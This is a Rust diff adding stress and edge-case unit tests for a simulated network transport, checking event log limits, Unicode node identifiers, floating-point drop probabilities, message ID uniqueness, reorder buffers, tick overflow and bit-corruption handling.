+                    sorted_ids.len(),
+                    burst_ids.len(),
+                    "Duplicate IDs detected in burst {}",
+                    burst
+                );
+
+                vt.advance_tick(10);
+            }
+
+            // Verify message delivery integrity despite ID pressure
+            let final_delivered = vt.collect_delivered_messages("id-tgt");
+            for msg in final_delivered {
+                assert!(msg.id > 0);
+                assert_eq!(msg.source, "id-src");
+                assert_eq!(msg.target, "id-tgt");
+                assert!(!msg.payload.is_empty());
+            }
+
+            // Event log should be consistent
+            let events = vt.event_log();
+            for event in events {
+                assert!(!event.event_code.is_empty());
+                if let Some(msg_id) = event.message_id {
+                    assert!(msg_id > 0);
+                }
+            }
+        }
+
+        #[test]
+        fn negative_event_log_memory_pressure_and_corruption_resilience() {
+            // Test event log under memory pressure and corruption scenarios
+            let mut vt = VirtualTransport::new(5555);
+
+            // Create many links to generate high event volume
+            for i in 0..100 {
+                let config = LinkFaultConfig {
+                    drop_probability: 0.1,
+                    reorder_depth: 5,
+                    corrupt_bit_count: 1,
+                    delay_ticks: 1,
+                    partition: i % 10 == 0, // Some partitioned links
+                };
+
+                let link_id = format!("log_stress_{:03}", i);
+                let _result = vt.create_link(
                     &link_id,
                     &format!("src_{}", i),
                     &format!("tgt_{}", i),
                     config,
                 );
+            }
+
+            // Generate massive event volume to stress log capacity
+            for round in 0..1000 {
+                // Send messages on subset of links
+                for i in (0..100).step_by(3) {
+                    let link_id = format!("log_stress_{:03}", i);
+                    let payload = format!("stress_round_{}_link_{}", round, i)
+                        .as_bytes()
+                        .to_vec();
+                    let _result = vt.send_message(&link_id, &payload);
+                }
+
+                // Occasionally manipulate links to generate more events
+                if round % 100 == 0 {
+                    for i in (0..100).step_by(10) {
+                        let link_id = format!("log_stress_{:03}", i);
+
+                        // Toggle partition to generate heal/partition events
+                        let new_config = LinkFaultConfig {
+                            drop_probability: 0.2,
+                            reorder_depth: 3,
+                            corrupt_bit_count: 2,
+                            delay_ticks: 2,
+                            partition: !((round / 100 + i) % 2 == 0),
+                        };
+                        let _update = vt.update_link_config(&link_id, new_config);
+                    }
+                }
+
+                vt.advance_tick(1);
+
+                // Check log capacity constraints periodically
+                if round % 100 == 0 {
+                    let events = vt.event_log();
+                    assert!(
+                        events.len() <= DEFAULT_MAX_EVENT_LOG_ENTRIES,
+                        "Event log exceeded capacity at round {}: {} entries",
+                        round,
+                        events.len()
+                    );
+
+                    // Verify event integrity under pressure
+                    let mut prev_tick = 0;
+                    for event in events {
+                        assert!(!event.event_code.is_empty());
+                        assert!(
+                            event.tick >= prev_tick,
+                            "Events should be chronologically ordered"
+                        );
+                        assert!(event.tick <= vt.current_tick());
+                        prev_tick = event.tick;
+
+                        // Event codes should be valid
+                        assert!(
+                            event.event_code.starts_with("VT-")
+                                || event.event_code.starts_with("ERR_VT_")
+                        );
+                    }
+                }
+            }
+
+            // Test event log corruption recovery
+            // Simulate scenarios that might corrupt event log state
+            let corruption_scenarios = [
+                // Rapid link creation/destruction
+                (0..50)
+                    .map(|i| format!("corrupt_rapid_{}", i))
+                    .collect::<Vec<_>>(),
+                // Links with extreme configurations
+                vec!["corrupt_extreme".to_string()],
+                // Unicode in link IDs
+                vec!["corrupt_unicode_节点".to_string()],
+            ];
+
+            for (scenario_idx, link_ids) in corruption_scenarios.into_iter().enumerate() {
+                for link_id in &link_ids {
+                    let config = match scenario_idx {
+                        0 => LinkFaultConfig::default(), // Rapid scenario
+                        1 => LinkFaultConfig {
+                            // Extreme scenario
+                            drop_probability: 1.0,
+                            reorder_depth: 10_000,
+                            corrupt_bit_count: 1000,
+                            delay_ticks: u64::MAX / 4,
+                            partition: true,
+                        },
+                        2 => LinkFaultConfig {
+                            // Unicode scenario
+                            drop_probability: 0.5,
+                            reorder_depth: 100,
+                            corrupt_bit_count: 8,
+                            delay_ticks: 1000,
+                            partition: false,
+                        },
+                        _ => LinkFaultConfig::default(),
+                    };
+
+                    if vt
+                        .create_link(link_id, "corrupt-src", "corrupt-tgt", config)
+                        .is_ok()
+                    {
+                        // Rapid operations to stress event logging
+                        for i in 0..100 {
+                            let payload = format!("corrupt_test_{}_{}", scenario_idx, i)
+                                .as_bytes()
+                                .to_vec();
+                            let _send = vt.send_message(link_id, &payload);
+
+                            if i % 10 == 0 {
+                                vt.advance_tick(1);
+                            }
+                        }
+
+                        if scenario_idx == 0 {
+                            // Rapid destruction for first scenario
+                            let _destroy = vt.destroy_link(link_id);
+                        }
+                    }
+                }
+            }
+
+            // Final integrity verification
+            let final_events = vt.event_log();
+            assert!(final_events.len() <= DEFAULT_MAX_EVENT_LOG_ENTRIES);
+
+            // All events should be well-formed despite corruption attempts
+            for event in final_events {
+                assert!(!event.event_code.is_empty());
+                assert!(event.tick <= vt.current_tick());
+                // Link ID may be empty for some event types
+                // Message ID may be None for non-message events
+            }
+
+            // System should still be functional
+            let final_test_config = LinkFaultConfig::default();
+            assert!(
+                vt.create_link("final_test", "final-src", "final-tgt", final_test_config)
+                    .is_ok()
+            );
+            assert!(vt.send_message("final_test", b"final_payload").is_ok());
+            vt.advance_tick(1);
+            let final_delivered = vt.collect_delivered_messages("final-tgt");
+            assert_eq!(final_delivered.len(), 1);
+        }
+
+        // ============================================================================
+        // EXTREME ADVERSARIAL NEGATIVE-PATH TESTS - COMPREHENSIVE COVERAGE
+        // ============================================================================
+        // Advanced attack resistance targeting virtual transport edge cases
+
+        #[test]
+        fn negative_unicode_bidirectional_injection_node_identifiers() {
+            // Test virtual transport resistance to Unicode BiDi attacks in node identifiers
+            let mut vt = VirtualTransport::new(666);
+
+            let unicode_attack_node_ids = vec![
+                // Right-to-left override attacks
+                ("rtl_basic", "node\u{202e}_gnissecorp\u{202c}"),
+                ("rtl_nested", "valid\u{202e}evil\u{202d}safe\u{202c}node"),
+                // Left-to-right override attacks
+                ("ltr_override", "node\u{202d}_processing\u{202c}"),
+                ("ltr_embedded", "test\u{202a}embedded\u{202c}node"),
+                // Directional isolate attacks
+                ("isolate_basic", "node\u{2066}isolated\u{2069}"),
+                ("isolate_rtl", "node\u{2067}rtl_content\u{2069}"),
+                // Zero-width character pollution
+                ("zws_pollution", "node\u{200b}_test\u{200c}_id\u{200d}"),
+                ("bom_injection", "\u{feff}node_test\u{feff}"),
+                // Mixed BiDi with zero-width
+                ("mixed_attack", "no\u{200b}de\u{202e}_evil\u{200b}\u{202c}"),
+                // Unicode confusables in node IDs
+                ("cyrillic_confuse", "nоde_test"), // Cyrillic 'о' instead of Latin 'o'
+                ("greek_confuse", "nοde_test"),    // Greek 'ο' instead of Latin 'o'
+            ];
+
+            for (test_name, attack_node_id) in unicode_attack_node_ids {
+                let link_id = format!("unicode_test_{}", test_name);
+
+                // Test link creation with Unicode-attacked node IDs
+                let config = LinkFaultConfig::default();
+                let create_result =
+                    vt.create_link(&link_id, attack_node_id, "normal_target", config);
 
                 match create_result {
                     Ok(_) => {
-                        created_links.push(link_id);
+                        // If link creation succeeds, test message operations
+                        let payload = format!("test_payload_{}", test_name).as_bytes().to_vec();
+                        let send_result = vt.send_message(&link_id, &payload);
+
+                        // Should handle Unicode node IDs without corruption
+                        assert!(
+                            send_result.is_ok() || send_result.is_err(),
+                            "Send should complete without panic for: {}",
+                            test_name
+                        );
+
+                        // Advance and check message delivery
+                        vt.advance_tick(1);
+                        let delivered = vt.collect_delivered_messages("normal_target");
+
+                        // Message delivery should work regardless of Unicode in source ID
+                        assert!(
+                            delivered.len() <= 1,
+                            "Should deliver at most one message: {}",
+                            test_name
+                        );
+
+                        if !delivered.is_empty() {
+                            let msg = &delivered[0];
+                            assert_eq!(
+                                msg.source, attack_node_id,
+                                "Source ID should be preserved: {}",
+                                test_name
+                            );
+                            assert_eq!(
+                                msg.payload, payload,
+                                "Payload should be intact: {}",
+                                test_name
+                            );
+                        }
+
+                        // Clean up
+                        vt.destroy_link(&link_id).ok();
                     }
                     Err(err) => {
-                        // Link creation failure is acceptable under stress
+                        // Some Unicode patterns may be rejected - verify meaningful error
                         assert!(
                             !err.to_string().is_empty(),
-                            "Creation error should be meaningful"
+                            "Error should be meaningful: {}",
+                            test_name
                         );
                     }
                 }
             }
 
-            // Rapid message sending on all created links
-            for (msg_idx, link_id) in created_links.iter().enumerate() {
-                for j in 0..5 {
-                    let payload = format!("concurrent_msg_{}_{}_{}", cycle, msg_idx, j)
-                        .as_bytes()
-                        .to_vec();
-                    let send_result = vt.send_message(link_id, &payload);
+            // Verify transport integrity after Unicode attack tests
+            let normal_result =
+                vt.create_link("normal_test", "src", "tgt", LinkFaultConfig::default());
+            assert!(
+                normal_result.is_ok(),
+                "Normal operation should work after Unicode tests"
+            );
+        }
 
-                    // Send may fail if link was destroyed or has issues
-                    match send_result {
-                        Ok(_) => {
-                            // Success is fine
+        #[test]
+        fn negative_floating_point_precision_probability_edge_cases() {
+            // Test drop probability handling with floating-point precision edge cases
+            let mut vt = VirtualTransport::new(777);
+
+            let fp_edge_cases = vec![
+                // Exact boundary values
+                (0.0, "exact_zero"),
+                (1.0, "exact_one"),
+                // Epsilon boundaries
+                (f64::EPSILON, "epsilon_positive"),
+                (1.0 - f64::EPSILON, "one_minus_epsilon"),
+                (f64::MIN_POSITIVE, "min_positive"),
+                // Near-boundary values
+                (0.0000000001, "near_zero"),
+                (0.9999999999, "near_one"),
+                // Precise fraction representations
+                (1.0 / 3.0, "one_third"),
+                (2.0 / 3.0, "two_thirds"),
+                (1.0 / 7.0, "one_seventh"),
+                // Values that might have floating-point representation issues
+                (0.1 + 0.2, "point_one_plus_point_two"), // Classic FP precision issue
+                (0.1 * 3.0, "point_one_times_three"),
+                (1.0 - 0.9, "one_minus_point_nine"),
+                // Subnormal boundaries
+                (f64::MIN_POSITIVE * 2.0, "subnormal_edge"),
+            ];
+
+            for (probability, test_name) in fp_edge_cases {
+                let config = LinkFaultConfig {
+                    drop_probability: probability,
+                    reorder_depth: 0,
+                    corrupt_bit_count: 0,
+                    delay_ticks: 0,
+                    partition: false,
+                };
+
+                let link_id = format!("fp_test_{}", test_name);
+                let create_result = vt.create_link(&link_id, "fp_src", "fp_tgt", config);
+
+                match create_result {
+                    Ok(_) => {
+                        // Test multiple messages to verify probability implementation
+                        let mut messages_sent = 0;
+                        let mut messages_delivered = 0;
+
+                        for i in 0..100 {
+                            let payload =
+                                format!("fp_test_{}_{}", test_name, i).as_bytes().to_vec();
+                            let send_result = vt.send_message(&link_id, &payload);
+
+                            if send_result.is_ok() {
+                                messages_sent += 1;
+                            }
+
+                            if i % 10 == 0 {
+                                vt.advance_tick(1);
+                                let delivered = vt.collect_delivered_messages("fp_tgt");
+                                messages_delivered += delivered.len();
+                            }
                         }
-                        Err(err) => {
-                            // Should be meaningful error
+
+                        // Final delivery check
+                        vt.advance_tick(10);
+                        let final_delivered = vt.collect_delivered_messages("fp_tgt");
+                        messages_delivered += final_delivered.len();
+
+                        // Verify drop probability behavior makes sense
+                        if probability == 0.0 {
+                            assert_eq!(
+                                messages_sent, messages_delivered,
+                                "Zero drop probability should deliver all: {}",
+                                test_name
+                            );
+                        } else if probability == 1.0 {
+                            assert_eq!(
+                                messages_delivered, 0,
+                                "100% drop probability should deliver none: {}",
+                                test_name
+                            );
+                        } else {
+                            // For intermediate probabilities, verify reasonable behavior
                             assert!(
-                                err.to_string().contains("link")
-                                    || err.to_string().contains("partition")
-                                    || err.to_string().contains("capacity"),
-                                "Send error should be meaningful: {}",
-                                err
+                                messages_delivered <= messages_sent,
+                                "Delivered should not exceed sent: {}",
+                                test_name
                             );
                         }
+
+                        vt.destroy_link(&link_id).ok();
+                    }
+                    Err(err) => {
+                        // Should provide meaningful validation error
+                        assert!(
+                            err.to_string().contains("probability")
+                                || err.to_string().contains("range"),
+                            "FP validation error should be meaningful: {} - {}",
+                            test_name,
+                            err
+                        );
                     }
                 }
             }
 
-            // Advance tick to process messages
-            vt.advance_tick(cycle as u64 + 1);
+            // Test invalid floating-point values
+            let invalid_fp_values = vec![
+                (f64::NAN, "nan"),
+                (f64::INFINITY, "pos_infinity"),
+                (f64::NEG_INFINITY, "neg_infinity"),
+                (-0.1, "negative"),
+                (1.1, "greater_than_one"),
+                (-1.0, "negative_one"),
+                (2.0, "two"),
+            ];
 
-            // Collect messages from all targets
-            for i in 0..link_count {
-                let delivered = vt.collect_delivered_messages(&format!("tgt_{}", i));
+            for (invalid_prob, test_name) in invalid_fp_values {
+                let config = LinkFaultConfig {
+                    drop_probability: invalid_prob,
+                    ..LinkFaultConfig::default()
+                };
 
-                // Verify delivered messages are well-formed
-                for msg in &delivered {
-                    assert!(
-                        !msg.payload.is_empty(),
-                        "Delivered payload should not be empty"
-                    );
-                    assert!(
-                        msg.tick_created <= vt.current_tick(),
-                        "Creation tick should be valid"
-                    );
-                    assert!(
-                        msg.tick_delivered.unwrap_or(0) <= vt.current_tick(),
-                        "Delivery tick should be valid"
-                    );
-                }
+                let validation_result = config.validate();
+                assert!(
+                    validation_result.is_err(),
+                    "Invalid FP value should be rejected: {} ({})",
+                    test_name,
+                    invalid_prob
+                );
+
+                let create_result =
+                    vt.create_link(&format!("invalid_{}", test_name), "src", "tgt", config);
+                assert!(
+                    create_result.is_err(),
+                    "Link creation with invalid probability should fail: {}",
+                    test_name
+                );
             }
+        }
 
-            // Rapid destruction of half the links
-            for (idx, link_id) in created_links.iter().enumerate() {
-                if idx % 2 == 0 {
-                    let destroy_result = vt.destroy_link(link_id);
-                    // Destruction may fail if link already destroyed or has issues
-                    match destroy_result {
-                        Ok(_) => {
-                            // Success is fine
-                        }
-                        Err(err) => {
+        #[test]
+        fn negative_message_id_overflow_exhaustion_boundaries() {
+            // Test message ID generation near overflow boundaries
+            let mut vt = VirtualTransport::new(888);
+
+            // Create link for testing
+            let config = LinkFaultConfig::default();
+            vt.create_link("id_test", "id_src", "id_tgt", config)
+                .unwrap();
+
+            // Simulate near-overflow scenario by manipulating internal counter
+            // (This tests the overflow protection logic)
+
+            // Test rapid message generation to stress ID allocation
+            let mut message_ids = std::collections::HashSet::new();
+            let mut successful_sends = 0;
+
+            for i in 0..10000 {
+                let payload = format!("id_overflow_test_{}", i).as_bytes().to_vec();
+                let send_result = vt.send_message("id_test", &payload);
+
+                match send_result {
+                    Ok(message_id) => {
+                        successful_sends += 1;
+
+                        // Verify message ID uniqueness
+                        assert!(
+                            message_ids.insert(message_id),
+                            "Message ID collision detected: {}",
+                            message_id
+                        );
+
+                        // Message ID should be reasonable
+                        assert!(
+                            message_id > 0,
+                            "Message ID should be positive: {}",
+                            message_id
+                        );
+                        assert!(
+                            message_id < u64::MAX,
+                            "Message ID should not be u64::MAX: {}",
+                            message_id
+                        );
+                    }
+                    Err(err) => {
+                        // If ID exhaustion occurs, should be graceful failure
+                        if err.to_string().contains("exhausted")
+                            || err.to_string().contains("overflow")
+                        {
+                            break; // Expected exhaustion
+                        } else {
                             assert!(
-                                err.to_string().contains("link")
-                                    || err.to_string().contains("not found"),
-                                "Destroy error should be meaningful: {}",
-                                err
+                                err.to_string().contains("exhausted")
+                                    || err.to_string().contains("overflow"),
+                                "Unexpected error during ID allocation: {err}"
                             );
+                            break;
                         }
                     }
                 }
-            }
-        }
 
-        // Final consistency check
-        let event_log = vt.event_log();
-        assert!(
-            event_log.len() <= DEFAULT_MAX_EVENT_LOG_ENTRIES,
-            "Event log should respect capacity limits"
-        );
-
-        for event in event_log {
-            assert!(
-                !event.event_code.is_empty(),
-                "Event code should not be empty"
-            );
-            assert!(
-                event.tick <= vt.current_tick(),
-                "Event tick should be valid"
-            );
-        }
-
-        // Transport should still be functional after stress test
-        let final_config = LinkFaultConfig::default();
-        assert!(
-            vt.create_link(
-                "final_consistency_test",
-                "final_src",
-                "final_tgt",
-                final_config
-            )
-            .is_ok(),
-            "Transport should be functional after concurrent operations"
-        );
-    }
-
-    #[test]
-    fn negative_payload_boundary_attacks_comprehensive() {
-        // Test message payloads designed to exploit boundary conditions
-        let mut vt = VirtualTransport::new(4444);
-
-        let config = LinkFaultConfig::default();
-        vt.create_link("payload_test", "payload_src", "payload_tgt", config)
-            .unwrap();
-
-        let boundary_payloads = vec![
-            // Empty payloads
-            ("empty", vec![]),
-            // Single byte boundaries
-            ("single_null", vec![0x00]),
-            ("single_max", vec![0xFF]),
-            // Power-of-2 sizes that might expose buffer issues
-            ("size_256", vec![0x42; 256]),
-            ("size_1024", vec![0x43; 1024]),
-            ("size_4096", vec![0x44; 4096]),
-            ("size_65536", vec![0x45; 65536]),
-            // Alternating bit patterns
-            ("alternating_aa", vec![0xAA; 1000]),
-            ("alternating_55", vec![0x55; 1000]),
-            (
-                "alternating_pattern",
-                (0..1000)
-                    .map(|i| if i % 2 == 0 { 0xAA } else { 0x55 })
-                    .collect(),
-            ),
-            // Sequential patterns
-            (
-                "sequential_bytes",
-                (0..256u8).cycle().take(1000).collect::<Vec<u8>>(),
-            ),
-            (
-                "reverse_bytes",
-                (0..256u8).rev().cycle().take(1000).collect::<Vec<u8>>(),
-            ),
-            // Boundary value patterns
-            ("all_zeros", vec![0x00; 1000]),
-            ("all_ones", vec![0xFF; 1000]),
-            ("null_terminated", b"payload\x00hidden\x00data".to_vec()),
-            // UTF-8 boundary cases
-            ("utf8_valid", "Hello, 世界! 🦀".as_bytes().to_vec()),
-            ("utf8_incomplete", vec![0xF0, 0x9F, 0xA6]), // Incomplete UTF-8 sequence
-            ("utf8_overlong", vec![0xC0, 0x80]),         // Overlong encoding
-            // Binary data that might be mistaken for text
-            ("fake_json", br#"{"evil": true, "payload": "#.to_vec()),
-            ("fake_xml", b"<payload>evil</payload>".to_vec()),
-            // Control character sequences
-            ("escape_sequences", b"\x1B[31m\x1B[2J\x1B[H".to_vec()),
-            ("mixed_control", b"normal\x00\x01\x02\x7F\x80\xFF".to_vec()),
-            // Very large payload (if memory allows)
-            ("large_payload", vec![0x99; 1_000_000]),
-        ];
-
-        for (test_name, payload) in boundary_payloads {
-            let send_result = vt.send_message("payload_test", &payload);
-
-            match send_result {
-                Ok(message_id) => {
-                    // Message accepted - verify it's processed correctly
-                    assert!(
-                        message_id > 0,
-                        "Message ID should be positive: {}",
-                        test_name
-                    );
-
+                // Periodically advance tick and check delivery
+                if i % 100 == 0 {
                     vt.advance_tick(1);
-                    let delivered = vt.collect_delivered_messages("payload_tgt");
+                    vt.collect_delivered_messages("id_tgt"); // Clear delivered
+                }
+            }
 
-                    if !delivered.is_empty() {
-                        let msg = &delivered[0];
+            assert!(
+                successful_sends > 0,
+                "Should successfully send some messages"
+            );
+            assert_eq!(
+                message_ids.len(),
+                successful_sends,
+                "All message IDs should be unique"
+            );
 
-                        // Verify payload integrity
-                        assert_eq!(
-                            msg.payload.len(),
-                            payload.len(),
-                            "Payload length should be preserved: {}",
+            // Test that we can still operate after stress test
+            vt.advance_tick(10);
+            let final_delivered = vt.collect_delivered_messages("id_tgt");
+            assert!(
+                final_delivered.len() <= successful_sends,
+                "Delivered count should not exceed sent count"
+            );
+        }
+
+        #[test]
+        fn negative_reorder_buffer_capacity_overflow_edge_cases() {
+            // Test reorder buffer with extreme capacity values and overflow scenarios
+            let mut vt = VirtualTransport::new(999);
+
+            let reorder_capacity_tests = vec![
+                // Boundary values
+                (0, "zero_reorder"),
+                (1, "single_reorder"),
+                (usize::MAX / 2, "half_max_reorder"),
+                // Large but reasonable values
+                (10000, "large_reorder"),
+                (100000, "very_large_reorder"),
+                // Powers of 2 (might expose buffer management issues)
+                (1024, "power_of_2_small"),
+                (65536, "power_of_2_large"),
+            ];
+
+            for (reorder_depth, test_name) in reorder_capacity_tests {
+                let config = LinkFaultConfig {
+                    drop_probability: 0.0, // No drops to test pure reordering
+                    reorder_depth,
+                    corrupt_bit_count: 0,
+                    delay_ticks: 0,
+                    partition: false,
+                };
+
+                let link_id = format!("reorder_test_{}", test_name);
+                let create_result = vt.create_link(&link_id, "reorder_src", "reorder_tgt", config);
+
+                match create_result {
+                    Ok(_) => {
+                        // Send messages to stress reorder buffer
+                        let messages_to_send = std::cmp::min(reorder_depth * 2 + 10, 1000);
+                        let mut sent_payloads = Vec::new();
+
+                        for i in 0..messages_to_send {
+                            let payload =
+                                format!("reorder_{}_{}", test_name, i).as_bytes().to_vec();
+                            sent_payloads.push(payload.clone());
+
+                            let send_result = vt.send_message(&link_id, &payload);
+
+                            match send_result {
+                                Ok(_) => {
+                                    // Success - continue
+                                }
+                                Err(err) => {
+                                    // Buffer capacity exceeded - should be graceful
+                                    assert!(
+                                        err.to_string().contains("capacity")
+                                            || err.to_string().contains("buffer")
+                                            || err.to_string().contains("reorder"),
+                                        "Buffer overflow error should be meaningful: {}",
+                                        err
+                                    );
+                                    break;
+                                }
+                            }
+
+                            // Periodically advance to trigger reorder processing
+                            if i % 10 == 0 {
+                                vt.advance_tick(1);
+                            }
+                        }
+
+                        // Advance significantly to ensure all messages are processed
+                        vt.advance_tick(100);
+
+                        // Collect delivered messages
+                        let delivered = vt.collect_delivered_messages("reorder_tgt");
+
+                        // Verify reorder buffer didn't lose messages (unless capacity exceeded)
+                        assert!(
+                            delivered.len() <= sent_payloads.len(),
+                            "Delivered should not exceed sent: {}",
                             test_name
                         );
-                        assert_eq!(
-                            msg.payload, payload,
-                            "Payload content should be preserved: {}",
-                            test_name
-                        );
 
-                        // Verify metadata is reasonable
-                        assert_eq!(
-                            msg.source, "payload_src",
-                            "Source should be correct: {}",
+                        // Verify delivered messages are valid
+                        for msg in &delivered {
+                            assert!(
+                                !msg.payload.is_empty(),
+                                "Message payload should not be empty: {}",
+                                test_name
+                            );
+                            assert_eq!(
+                                msg.source, "reorder_src",
+                                "Message source should be correct: {}",
+                                test_name
+                            );
+                            assert_eq!(
+                                msg.target, "reorder_tgt",
+                                "Message target should be correct: {}",
+                                test_name
+                            );
+                        }
+
+                        vt.destroy_link(&link_id).ok();
+                    }
+                    Err(err) => {
+                        // Large reorder depths may be rejected - verify meaningful error
+                        if reorder_depth > 100000 {
+                            assert!(
+                                err.to_string().contains("depth")
+                                    || err.to_string().contains("capacity")
+                                    || err.to_string().contains("reorder"),
+                                "Large reorder depth error should be meaningful: {}",
+                                err
+                            );
+                        } else {
+                            assert!(
+                                reorder_depth > 100000,
+                                "Unexpected error for reasonable reorder depth {reorder_depth}: {err}"
+                            );
+                        }
+                    }
+                }
+            }
+        }
+
+        #[test]
+        fn negative_tick_arithmetic_overflow_comprehensive_boundaries() {
+            // Test tick arithmetic with values that could cause overflow
+            let mut vt = VirtualTransport::new(1111);
+
+            let tick_overflow_scenarios = vec![
+                // Near u64::MAX boundaries
+                (u64::MAX - 1000, 999, "near_max_safe"),
+                (u64::MAX - 1000, 1001, "near_max_overflow"),
+                (u64::MAX - 1, 1, "max_minus_one_plus_one"),
+                (u64::MAX, 0, "max_with_zero_delay"),
+                // Large base values with delays
+                (u64::MAX / 2, u64::MAX / 2 + 100, "half_max_addition"),
+                (1u64 << 62, 1u64 << 62, "large_power_of_two"),
+                // Edge cases around delay calculation
+                (0, u64::MAX, "zero_base_max_delay"),
+                (1000, u64::MAX - 500, "normal_base_huge_delay"),
+                // Power-of-2 boundaries (might expose bit manipulation issues)
+                (u32::MAX as u64, u32::MAX as u64, "u32_boundary_sum"),
+                ((1u64 << 32) - 1, (1u64 << 32) - 1, "near_u32_boundary"),
+            ];
+
+            for (base_tick, delay_ticks, test_name) in tick_overflow_scenarios {
+                let config = LinkFaultConfig {
+                    drop_probability: 0.0,
+                    reorder_depth: 0,
+                    corrupt_bit_count: 0,
+                    delay_ticks,
+                    partition: false,
+                };
+
+                let link_id = format!("tick_test_{}", test_name);
+                let create_result = vt.create_link(&link_id, "tick_src", "tick_tgt", config);
+
+                match create_result {
+                    Ok(_) => {
+                        // Set current tick to base value
+                        for _ in 0..std::cmp::min(base_tick, 1000) {
+                            vt.advance_tick(std::cmp::max(1, base_tick / 1000));
+                        }
+
+                        // Send message with overflow-prone delay
+                        let payload = format!("tick_overflow_{}", test_name).as_bytes().to_vec();
+                        let send_result = vt.send_message(&link_id, &payload);
+
+                        match send_result {
+                            Ok(_) => {
+                                // If send succeeds, test tick advancement without overflow panic
+                                let current_tick_before = vt.current_tick();
+
+                                // Try advancing tick (should not overflow/panic)
+                                let advance_amount = std::cmp::min(delay_ticks + 100, 1000);
+                                for _ in 0..advance_amount {
+                                    vt.advance_tick(1);
+
+                                    // Verify tick is monotonically increasing or saturated
+                                    let current_tick = vt.current_tick();
+                                    assert!(
+                                        current_tick >= current_tick_before,
+                                        "Tick should not decrease: {}",
+                                        test_name
+                                    );
+                                }
+
+                                // Check message delivery after advancement
+                                let delivered = vt.collect_delivered_messages("tick_tgt");
+                                assert!(
+                                    delivered.len() <= 1,
+                                    "Should deliver at most one message: {}",
+                                    test_name
+                                );
+
+                                if !delivered.is_empty() {
+                                    let msg = &delivered[0];
+                                    assert!(
+                                        msg.tick_delivered.is_some(),
+                                        "Delivered message should have delivery tick: {}",
+                                        test_name
+                                    );
+                                    if let Some(delivered_tick) = msg.tick_delivered {
+                                        assert!(
+                                            delivered_tick >= msg.tick_created,
+                                            "Delivery tick should be >= creation tick: {}",
+                                            test_name
+                                        );
+                                    }
+                                }
+                            }
+                            Err(err) => {
+                                // Acceptable to reject overflow-prone configurations
+                                assert!(
+                                    err.to_string().contains("tick")
+                                        || err.to_string().contains("overflow")
+                                        || err.to_string().contains("delay"),
+                                    "Tick overflow error should be meaningful: {} - {}",
+                                    test_name,
+                                    err
+                                );
+                            }
+                        }
+
+                        vt.destroy_link(&link_id).ok();
+                    }
+                    Err(err) => {
+                        // Link creation failure for overflow scenarios is acceptable
+                        assert!(
+                            !err.to_string().is_empty(),
+                            "Error should be meaningful: {}",
                             test_name
                         );
-                        assert_eq!(
-                            msg.target, "payload_tgt",
-                            "Target should be correct: {}",
-                            test_name
+                    }
+                }
+            }
+
+            // Verify transport still works after overflow tests
+            let normal_config = LinkFaultConfig::default();
+            assert!(
+                vt.create_link("post_overflow_test", "src", "tgt", normal_config)
+                    .is_ok(),
+                "Normal operation should work after overflow tests"
+            );
+        }
+
+        #[test]
+        fn negative_corruption_bit_manipulation_boundary_attacks() {
+            // Test message corruption with extreme bit manipulation scenarios
+            let mut vt = VirtualTransport::new(2222);
+
+            let corruption_scenarios = vec![
+                // Boundary bit counts
+                (0, "zero_corruption"),
+                (1, "single_bit"),
+                (8, "byte_corruption"),
+                (64, "eight_bytes"),
+                // Large bit counts
+                (1000, "large_corruption"),
+                (8192, "kilobyte_corruption"),
+                // Edge cases that might cause overflow
+                (usize::MAX / 8, "near_max_bytes"),
+                (u32::MAX as usize, "u32_max_bits"),
+                // Power-of-2 values
+                (256, "power_of_2_small"),
+                (1024, "power_of_2_medium"),
+                (65536, "power_of_2_large"),
+            ];
+
+            for (corrupt_bit_count, test_name) in corruption_scenarios {
+                let config = LinkFaultConfig {
+                    drop_probability: 0.0, // No drops to test pure corruption
+                    reorder_depth: 0,
+                    corrupt_bit_count,
+                    delay_ticks: 0,
+                    partition: false,
+                };
+
+                let link_id = format!("corrupt_test_{}", test_name);
+                let create_result = vt.create_link(&link_id, "corrupt_src", "corrupt_tgt", config);
+
+                match create_result {
+                    Ok(_) => {
+                        // Test corruption with various payload sizes
+                        let payload_sizes = vec![1, 8, 64, 256, 1000, 8192];
+
+                        for payload_size in payload_sizes {
+                            let original_payload: Vec<u8> =
+                                (0..payload_size).map(|i| (i % 256) as u8).collect();
+
+                            let send_result = vt.send_message(&link_id, &original_payload);
+
+                            match send_result {
+                                Ok(_) => {
+                                    vt.advance_tick(1);
+                                    let delivered = vt.collect_delivered_messages("corrupt_tgt");
+
+                                    if !delivered.is_empty() {
+                                        let msg = &delivered[0];
+
+                                        // Verify payload length is preserved
+                                        assert_eq!(
+                                            msg.payload.len(),
+                                            original_payload.len(),
+                                            "Payload length should be preserved: {} size {}",
+                                            test_name,
+                                            payload_size
+                                        );
+
+                                        if corrupt_bit_count == 0 {
+                                            // No corruption - should be identical
+                                            assert_eq!(
+                                                msg.payload, original_payload,
+                                                "No corruption should preserve payload: {}",
+                                                test_name
+                                            );
+                                        } else if corrupt_bit_count < payload_size * 8 {
+                                            // Some corruption - should be different but reasonable
+                                            let mut differing_bits = 0;
+                                            for i in 0..original_payload.len() {
+                                                let diff = original_payload[i] ^ msg.payload[i];
+                                                differing_bits += diff.count_ones() as usize;
+                                            }
+
+                                            // Should have approximately the requested number of bit flips
+                                            if payload_size * 8 >= corrupt_bit_count {
+                                                assert!(
+                                                    differing_bits > 0,
+                                                    "Should have some bit differences: {} size {}",
+                                                    test_name,
+                                                    payload_size
+                                                );
+                                                assert!(
+                                                    differing_bits <= corrupt_bit_count * 2,
+                                                    "Bit differences should be reasonable: {} size {}",
+                                                    test_name,
+                                                    payload_size
+                                                );
+                                            }
+                                        }
+                                    }
+                                }
+                                Err(err) => {
+                                    // Large corruption configurations may be rejected
+                                    if corrupt_bit_count > 10000 {
+                                        assert!(
+                                            err.to_string().contains("corrupt")
+                                                || err.to_string().contains("bit")
+                                                || err.to_string().contains("size"),
+                                            "Corruption error should be meaningful: {} - {}",
+                                            test_name,
+                                            err
+                                        );
+                                    } else {
+                                        assert!(
+                                            corrupt_bit_count > 10000,
+                                            "Unexpected error for reasonable corruption {corrupt_bit_count}: {err}"
+                                        );
+                                    }
+                                }
+                            }
+                        }
+
+                        vt.destroy_link(&link_id).ok();
+                    }
+                    Err(err) => {
+                        // Very large bit counts may be rejected at link creation
+                        if corrupt_bit_count > 100000 {
+                            assert!(
+                                err.to_string().contains("corrupt")
+                                    || err.to_string().contains("bit"),
+                                "Large corruption error should be meaningful: {}",
+                                err
+                            );
+                        } else {
+                            assert!(
+                                corrupt_bit_count > 100000,
+                                "Unexpected link creation error for corruption {corrupt_bit_count}: {err}"
+                            );
+                        }
+                    }
+                }
+            }
+        }
